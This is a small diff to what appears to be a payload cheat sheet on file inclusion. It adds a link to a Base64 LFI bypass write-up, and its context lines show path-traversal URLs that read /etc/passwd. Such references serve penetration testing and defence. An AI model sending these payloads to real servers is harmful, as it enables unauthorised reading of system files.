@@ -41,6 +41,8 @@ http://example.com/index.php?page=..///////..////..//////etc/passwd
 ```txt
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
+### Using Base64
+[One LFI bypass to rule them all (using base64)](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)
 ## Remote File Inclusion
 ### Null byte
 ```txt
